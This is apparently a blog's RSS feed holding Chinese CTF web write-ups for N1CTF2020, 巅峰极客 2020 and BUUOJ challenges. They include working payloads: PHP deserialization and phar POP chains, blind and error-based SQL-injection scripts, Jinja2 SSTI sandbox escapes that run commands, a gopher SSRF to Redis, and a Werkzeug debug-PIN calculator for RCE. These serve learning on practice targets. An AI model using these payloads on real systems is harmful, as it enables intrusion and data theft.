poc =&#39;gopher://172.20.0.7:6379/_&#39;+quote(&#39;ZADD byte:requests 0 &amp;quot;&#39;)+quote(poc)+quote(&#39;&amp;quot;&#39;)
print(poc)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;时间显得有点急，这道题就草草的复现了一遍，以后时间再本地深究&lt;/p&gt;
</description>
        </item>
        <item>
        <title>N1CTF2020</title>
        <link>https://anthem-whisper.github.io/p/n1ctf2020/</link>
        <pubDate>Tue, 20 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/n1ctf2020/</guid>
        <description>&lt;p&gt;N1CTF打不过根本打不过，就做了个签到&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;signin&#34;&gt;SignIn&lt;/h3&gt;
&lt;p&gt;考点：反序列化，布尔盲注，报错注入&lt;/p&gt;
&lt;p&gt;这是源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
highlight_file(__FILE__);
class ip {
    public $ip;
    public function waf($info){
    }
    public function __construct() {
        if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
            $this-&amp;gt;ip = $this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
        }else{
            $this-&amp;gt;ip =$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];
        }
    }
    public function __toString(){
        $con=mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;********&amp;quot;,&amp;quot;n1ctf_websign&amp;quot;);
        $sqlquery=sprintf(&amp;quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&amp;quot;,$this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return &amp;quot;your ip looks ok!&amp;quot;;
        }
        mysqli_close($con);
    }
}
 
class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this-&amp;gt;ip = $ip;
    }
    public function getflag(){
        if(md5($this-&amp;gt;check)===md5(&amp;quot;key****************&amp;quot;)){
            readfile(&#39;/flag&#39;);
        }
        return $this-&amp;gt;ip;
    }
    public function __wakeup(){
        if(stristr($this-&amp;gt;ip, &amp;quot;n1ctf&amp;quot;)!==False)
            $this-&amp;gt;ip = &amp;quot;welcome to n1ctf2020&amp;quot;;
        else
            $this-&amp;gt;ip = &amp;quot;noip&amp;quot;;
    }
    public function __destruct() {
        echo $this-&amp;gt;getflag();
    }
 
}
if(isset($_GET[&#39;input&#39;])){
    $input = $_GET[&#39;input&#39;];
    unserialize($input);
}

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路是利用stristr函数触发__toString，然后在XFF头来进行一个sql注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pop = new flag();
$pop-&amp;gt;ip = new ip();
echo serialize($pop);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面回显就只会有noip和welcome to n1ctf2020两种，因为__toString方法里面只有return，所以我们并不能直接看到mysql的回显（无论成功与否），只能利用两种回显来判断我们的sql语句是否逻辑正确。&lt;/p&gt;
&lt;p&gt;简单fuzz了一下，过滤了like、sleep、BENCHMARK，不能延时注入。&lt;/p&gt;
&lt;p&gt;因为他&lt;code&gt;return mysqli_error($con);&lt;/code&gt;返回了MySQL的报错信息，我们便可以报错注入；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39; or updatexml(1,concat(0x7e,(select if((1=1),&#39;n1ctf&#39;,0)),0x7e),1) or &#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1=1和1=0分别返回了不同的信息。&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
 
url = &#39;http://101.32.205.189/index.php?input=O:4:&amp;quot;flag&amp;quot;:2:{s:2:&amp;quot;ip&amp;quot;;O:2:&amp;quot;ip&amp;quot;:1:{s:2:&amp;quot;ip&amp;quot;;i:1;}s:5:&amp;quot;check&amp;quot;;s:4:&amp;quot;test&amp;quot;;}&#39;
result = &#39;&#39;
req = requests.session()
for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high &amp;gt; low:
        #babyselect = &amp;quot;database()&amp;quot;#n1ctf_websign
        #babyselect = &amp;quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&amp;quot;#n1ip,n1key
        #babyselect = &amp;quot;(select group_concat(column_name) from information_schema.columns where table_name=&#39;n1key&#39;)&amp;quot;#id,key
        babyselect = &amp;quot;(select `key` from n1key)&amp;quot;#n1ctf20205bf75ab0a30dfc0c
        select = &amp;quot;ascii(substr({},{},1))&amp;gt;{}&amp;quot;.format(babyselect, x, mid)
        payload = &amp;quot;&#39; or updatexml(1,concat(0x7e,(select if(({}),&#39;n1ctf&#39;,0)),0x7e),1) or &#39;&amp;quot;.format(select)
        data = {&amp;quot;X-Forwarded-For&amp;quot;: payload}
        resp = requests.get(url, headers=data)  #GET:params=data POST:data=data
        print(payload)
        if resp.text.count(&#39;welcome to n1ctf2020&#39;) == 2:  #
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    # print(mid)
    result += chr(int(mid))
    print(result)
print(&amp;quot;end.......&amp;quot;)
print(result)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;key是关键字，只能select &lt;code&gt;key&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到key：n1ctf20205bf75ab0a30dfc0c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pop = new flag();
$pop-&amp;gt;ip = new ip();
$pop-&amp;gt;check = &amp;quot;n1ctf20205bf75ab0a30dfc0c&amp;quot;;
echo serialize($pop);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;传参得到：&lt;/p&gt;
&lt;p&gt;n1ctf{you_g0t_1t_hack_for_fun}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2020“巅峰极客”</title>
        <link>https://anthem-whisper.github.io/p/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</link>
        <pubDate>Sun, 27 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228104117.jpeg" alt="Featured image of post 2020“巅峰极客”" /&gt;&lt;h3 id=&#34;babyphp2&#34;&gt;babyphp2&lt;/h3&gt;
&lt;p&gt;考点：phar反序列化、pop链、&lt;code&gt;compress.zlib://phar://&lt;/code&gt;绕过&lt;code&gt;^phar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Paper：https://paper.seebug.org/680/&lt;/p&gt;
&lt;p&gt;题目一开始有&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2_easyphp2.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.zip&lt;/a&gt;给了源代码，下载过来审计;&lt;/p&gt;
&lt;p&gt;大概是有三个功能：文件上传、文件读取、SQL查询（登录框）&lt;/p&gt;
&lt;h4 id=&#34;phar反序列化&#34;&gt;phar反序列化&lt;/h4&gt;
&lt;p&gt;我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
session_start();
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public $backup;
    public function login() {
        if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;])){
        $mysqli=new dbCtrl();
        $this-&amp;gt;id=$mysqli-&amp;gt;login();
        if($this-&amp;gt;id){
        $_SESSION[&#39;id&#39;]=$this-&amp;gt;id;
        $_SESSION[&#39;login&#39;]=1;
        echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];
        echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];
        echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;upload.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;
        }
    }
}
    public function upload(){
        $uploader=new Upload();
        $uploader-&amp;gt;upload();
    }
    public function read(){
        $reader=new reader();
        $reader-&amp;gt;read($_POST[&#39;filename&#39;]);
    }
    public function __toString()
    {
        $this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;
        $user = new User();
        $user-&amp;gt;id = $_SESSION[&#39;id&#39;];
        $user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];
        return serialize($user);
    }
}
class dbCtrl
{
    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
    public $dbuser=&amp;quot;p3rh4ps&amp;quot;;
    public $dbpass=&amp;quot;p3rh4ps&amp;quot;;
    public $database=&amp;quot;p3rh4ps&amp;quot;;
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this-&amp;gt;name=$_POST[&#39;username&#39;];
        $this-&amp;gt;password=$_POST[&#39;password&#39;];
    }
    public function login()
    {
        $this-&amp;gt;mysqli=new mysqli($this-&amp;gt;hostname, $this-&amp;gt;dbuser, $this-&amp;gt;dbpass, $this-&amp;gt;database);
        if ($this-&amp;gt;mysqli-&amp;gt;connect_error) {
            die(&amp;quot;连接失败，错误:&amp;quot; . $this-&amp;gt;mysqli-&amp;gt;connect_error);
        }
        $sql=&amp;quot;select id,password from users where username=?&amp;quot;;
        $result=$this-&amp;gt;mysqli-&amp;gt;prepare($sql);
        $result-&amp;gt;bind_param(&#39;s&#39;, $this-&amp;gt;name);
        $result-&amp;gt;execute();
        $result-&amp;gt;bind_result($idResult, $passwordResult);
        $result-&amp;gt;fetch();
        $result-&amp;gt;close();
        if ($this-&amp;gt;token==&#39;admin&#39;) {
            return $idResult;
        }
        if (!$idResult) {
            echo(&#39;用户不存在!&#39;);
            return false;
        }
        if (md5($this-&amp;gt;password)!==$passwordResult) {
            echo(&#39;密码错误！&#39;);
            return false;
        }
        $_SESSION[&#39;token&#39;]=$this-&amp;gt;name;
        return $idResult;
    }
    public function __destruct(){
        echo $this-&amp;gt;token;
    }
}
Class Upload{
    public $flag;
    public $file;
    public $ext;
    function __construct(){
        $this-&amp;gt;flag = 1;
        $this-&amp;gt;black_list = [&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;=&#39;, &#39;co&#39;, &#39;\\&#39;, &#39;&amp;quot;&#39;, &#39;\&#39;&#39;];
    }
    function check(){
        $ext = substr($_FILES[&#39;file&#39;][&#39;name&#39;], strpos($_FILES[&#39;file&#39;][&#39;name&#39;], &#39;.&#39;));
        $reg=implode(&amp;quot;|&amp;quot;,$this-&amp;gt;black_list);
        $reg = &amp;quot;/&amp;quot; . $reg . &amp;quot;\x|\s|[\x01-\x20]/i&amp;quot;;
        if(preg_match($reg, $ext)){
            $this-&amp;gt;flag = 0;
        }
        $this-&amp;gt;ext = $ext;
    }
 
    function __wakeup(){
        $this-&amp;gt;flag = 1;
    }
 
    function upload(){
        $this-&amp;gt;file = $_FILES[&#39;file&#39;];
        $this-&amp;gt;check();
        if($this-&amp;gt;flag){
            if(isset($_FILES[&#39;file&#39;])){
                if ($_FILES[&amp;quot;file&amp;quot;][&amp;quot;error&amp;quot;] &amp;gt; 0){
                    echo &amp;quot;Error: &amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;error&amp;quot;];
                }
                else{
                    if (file_exists(&amp;quot;upload/&amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;])){
                        echo $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;] . &amp;quot; already exists. &amp;quot;;
                    }
                    else{
                        if ($_FILES[&amp;quot;file&amp;quot;][&amp;quot;size&amp;quot;] &amp;gt; 10240){
                            echo &amp;quot;too big&amp;quot;;
                        }
                        else{
                            $new_addr = $_SERVER[&#39;DOCUMENT_ROOT&#39;] . &amp;quot;/upload/&amp;quot; . md5($_FILES[&#39;file&#39;][&#39;name&#39;]) . $this-&amp;gt;ext;
                            echo $new_addr;
                            move_uploaded_file($_FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp_name&amp;quot;], $new_addr);
                            return $new_addr;
                        }
                    }
                }
            }
        }
        else{
            die(&amp;quot;Noooooooooooooooooooooooooooo!&amp;quot;);
        }
    }
}
 
Class Reader{
    public $filename;
    public $result;
    public function read($filename){
        if (preg_match(&amp;quot;/flag/i&amp;quot;,$filename)){
            die(&amp;quot;想多了嗷&amp;quot;);
        }
        if (preg_match(&amp;quot;/sh/i&amp;quot;,$filename)){
            die(&amp;quot;nooooooooooo!&amp;quot;);
        }
        if (preg_match(&amp;quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&amp;quot;,$filename)){
            die(&amp;quot;Invid Schema!&amp;quot;);
        }
        echo file_get_contents($filename);
    }
    public function __set($name,$val){
        echo file_get_contents($val);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;众所周知，要触发phar反序列化，必须有文件操作函数，常见的大概是以下这些：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116013601.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;在class.php里面，能触发的地方有两处：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第117行file_exists&lt;/li&gt;
&lt;li&gt;第153和156行的file_get_contents&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们起先看到的是第117行的file_exists，我们在这里尝试了一番之后发现这里并不能触发phar反序列化。&lt;/p&gt;
&lt;p&gt;原因是&lt;code&gt;file_exists(&amp;quot;upload/&amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;])&lt;/code&gt;进行了拼接，phar://是传不进去的，那么剩下的唯一能触发的地方只有第153和156行的&lt;code&gt;file_get_contents&lt;/code&gt;了。&lt;/p&gt;
&lt;p&gt;而实际上能触发的只有153行的&lt;code&gt;file_get_contents&lt;/code&gt;，156行的是给你读flag的。&lt;/p&gt;
&lt;h4 id=&#34;构造pop链&#34;&gt;构造pop链&lt;/h4&gt;
&lt;p&gt;全局搜索魔术方法；&lt;/p&gt;
&lt;p&gt;155行Reader::__set&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __set($name,$val){
    echo file_get_contents($val);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;31行User::__toString&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __toString()
{
    $this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;
    $user = new User();
    $user-&amp;gt;id = $_SESSION[&#39;id&#39;];
    $user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];
    return serialize($user);
}
 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;81行dbCtrl::__destruct&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __destruct(){
    echo $this-&amp;gt;token;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pop链很明确：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//pop链
$pop = new dbCtrl();
$pop-&amp;gt;token = new User();
$pop-&amp;gt;token-&amp;gt;nickname = new Reader();
$pop-&amp;gt;token-&amp;gt;backup = &#39;/flag&#39;;
 
//构造phar文件
@unlink(&amp;quot;phar.phar&amp;quot;);
$phar = new Phar(&amp;quot;phar.phar&amp;quot;);
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;GIF89a&amp;quot;.&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;);
$phar-&amp;gt;setMetadata($pop);
$phar-&amp;gt;addFromString(&amp;quot;test.jpg&amp;quot;, &amp;quot;test&amp;quot;);
$phar-&amp;gt;stopBuffering();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行得到一个phar.phar，改后缀（ph被waf了），上传。&lt;/p&gt;
&lt;p&gt;在read.php里面传入&lt;code&gt;compress.zlib://phar:///var/www/html/upload/xxx&lt;/code&gt;获得flag&lt;/p&gt;
&lt;h3 id=&#34;babyflask&#34;&gt;babyflask&lt;/h3&gt;
&lt;p&gt;考点：常规SSTI和沙盒逃逸&lt;/p&gt;
&lt;p&gt;题目挺友好的，没有任何过滤，随便找个payload就可以打出来；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?name={{().__class__.__bases__.__getitem__(0).__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;babyback&#34;&gt;babyback&lt;/h3&gt;
&lt;p&gt;考点：sqli单引号逃逸、bool盲注、&lt;/p&gt;
&lt;p&gt;进去一个登录框；&lt;/p&gt;
&lt;p&gt;fuzz一波之后发现ban掉了单双引号，自然想到了\造成的单引号逃逸。&lt;/p&gt;
&lt;h4 id=&#34;sqli盲注&#34;&gt;sqli盲注&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;username=\&amp;amp;password=||1#
//提示密码错误，正常的应该是用户名或密码错误
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后还发现ban了select，我拼命地想去绕，卡了很久，结果根本不用注表名列名，只需要得到管理员密码就行了（在robots.txt也有提示）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=\&amp;amp;password=||ascii(substr(password,1,1))&amp;gt;1#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里是盲注的exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python3
#wh1sper
import requests
host = &#39;http://eci-2zebr3la2yjigbu8w27y.cloudeci1.ichunqiu.com/index.php&#39;
def mid(bot, top):
    return (int)(0.5 * (top + bot))
def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = &#39;database()&#39;#--p3rh4ps
            babyselect = &#39;password&#39;#--uAreRigHt
            data = {
                &amp;quot;username&amp;quot;: &amp;quot;\\&amp;quot;,
                &amp;quot;password&amp;quot;: &amp;quot;||ascii(substr({},{},1))&amp;gt;{}#&amp;quot;.format(babyselect, j, mid(bot, top))
            }
            r = requests.post(url=host, data=data)
            #print(r.text)
            #print(data)
            if &#39;&amp;gt;密码错误&amp;lt;&#39; in r.text:
                if top - 1 == bot:
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)
            else:
                if top - 1 == bot:
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)
if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;登录，来到第二关；&lt;/p&gt;
&lt;p&gt;是一个eval函数，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eval($command.&amp;quot;=false&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;waf很强，可以用取反直接include根目录的flag：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;command=?&amp;gt;&amp;lt;?=include~%D0%99%93%9E%98?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>BUUOJ刷题记录(3)</title>
        <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</link>
        <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png" alt="Featured image of post BUUOJ刷题记录(3)" /&gt;&lt;h3 id=&#34;fbctf2019rceservicehttpsbuuojcnchallengesfbctf2019rceservice&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[FBCTF2019]RCEService&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;FBCTF2019]RCEService&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：%0a绕过正则匹配，绝对路径调用系统命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116015235.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给&lt;/p&gt;
&lt;p&gt;比赛的时候应该是给了源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
 
putenv(&#39;PATH=/home/rceservice/jail&#39;);
 
if (isset($_REQUEST[&#39;cmd&#39;])) {
    $json = $_REQUEST[&#39;cmd&#39;];
 
    if (!is_string($json)) {
        echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;
    } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {
        echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;
    } else {
        echo &#39;Attempting to run command:&amp;amp;lt;br/&amp;amp;gt;&#39;;
        $cmd = json_decode($json, true)[&#39;cmd&#39;];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo &#39;Invalid input&#39;;
        }
        echo &#39;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;
    }
}
 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过&lt;/p&gt;
&lt;p&gt;然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。&lt;/p&gt;
&lt;p&gt;flag在PATH的上级目录。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?cmd={%0A&amp;quot;cmd&amp;quot;:&amp;quot;/bin/cat /home/rceservice/flag&amp;quot;%0A}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;gyctf2020flaskapphttpsbuuojcnchallengesgyctf2020flaskapp&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GYCTF2020]FlaskApp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GYCTF2020]FlaskApp&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：flaskSSTI、pin码&lt;/p&gt;
&lt;p&gt;referer：https://blog.csdn.net/Alexhcf/article/details/108400293&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116014936.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h4 id=&#34;从base64解码发现ssti&#34;&gt;从base64解码发现SSTI&lt;/h4&gt;
&lt;p&gt;题目最开始给了两个页面，一个是base64加密、一个是base64解密&lt;/p&gt;
&lt;p&gt;在base64解密的页面如果解密出现错误的话，会开启debug&lt;/p&gt;
&lt;p&gt;而且在base64解密的页面发现了模板注入，传入&lt;code&gt;{{config}}&lt;/code&gt;的base64编码会看到以下界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116014940.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那么我们可以沙箱逃逸试试，可以用jinja2中控制结构 &lt;code&gt;{% %}&lt;/code&gt; ，也可以用变量取值 &lt;code&gt;{{}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果用控制结构：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{% for c in [].__class__.__base__.__subclasses__() %} 
{% if &#39;catch_warnings&#39; in c.__name__%} 
{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }} 
{% endif %}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;改成一行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{% for c in [].__class__.__base__.__subclasses__() %}{% if &#39;catch_warnings&#39; in c.__name__%}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以读取app.py的源码，当然也可读取根目录的flag&lt;/p&gt;
&lt;p&gt;如果用变量取值：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以列根目录文件（这个解法是非预期，预期是pin）&lt;/p&gt;
&lt;p&gt;但是需要注意的是&lt;code&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()}}&lt;/code&gt;并不会有任何回显，需要&lt;code&gt;subclasses__()[xx]&lt;/code&gt;慢慢找&lt;/p&gt;
&lt;p&gt;预期解是算pin码然后用debug来RCE；&lt;/p&gt;
&lt;h4 id=&#34;读取6个参数计算pin码&#34;&gt;读取6个参数计算pin码&lt;/h4&gt;
&lt;p&gt;任意文件读取的payload是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中filename是文件名称&lt;/p&gt;
&lt;p&gt;通过PIN码生成机制可知，需要获取如下信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器运行flask所登录的用户名。通过&lt;code&gt;/etc/passwd&lt;/code&gt;中可以猜测为&lt;code&gt;flaskweb&lt;/code&gt; 或者&lt;code&gt;root&lt;/code&gt;，此处用的&lt;code&gt;flaskweb&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;modname。一般不变就是flask.app&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getattr(app, “__name__”, app.__class__.__name__)&lt;/code&gt;。python该值一般为Flask，该值一般不变&lt;/li&gt;
&lt;li&gt;flask库下app.py的绝对路径。报错信息会泄露该值。题中为&lt;code&gt;/usr/local/lib/python3.7/site-packages/flask/app.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当前网络的mac地址（十六进制）的十进制数。通过文件&lt;code&gt;/sys/class/net/eth0/address&lt;/code&gt; 获取(eth0为网卡名)，我开的BUU的docker为&lt;code&gt;02:42:ae:01:2d:af&lt;/code&gt; ，转换后为&lt;code&gt;2485410376060&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;机器的id：对于非docker机每一个机器都会有自已唯一的id
Linux：&lt;code&gt;/etc/machine-id&lt;/code&gt;或&lt;code&gt;/proc/sys/kernel/random/boot_i&lt;/code&gt;，有的系统没有这两个文件
&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/HacTF/p/8160076.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows&lt;/a&gt;
docker：&lt;code&gt;/proc/self/cgroup&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;获取了6个值之后，可以利用exp计算pin码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import hashlib
from itertools import chain
 
probably_public_bits = [
    &#39;flaskweb&#39;,  # 服务器运行flask所登录的用户名
    &#39;flask.app&#39;,  # modname
    &#39;Flask&#39;,  # getattr(app, &amp;quot;\_\_name__&amp;quot;, app.\_\_class__.\_\_name__)
    &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;,  # flask库下app.py的绝对路径
]
 
private_bits = [
    &#39;2485410409903&#39;,  # 当前网络的mac地址的十进制数
    &#39;0a1d70fa2590282a8abb5e96d8f175b147dd2477459d97c179af421feb9260cd&#39;  # 机器的id
]
 
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)
cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b&#39;pinsalt&#39;)
    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行得到131-679-327，在debug输入然后RCE&lt;/p&gt;
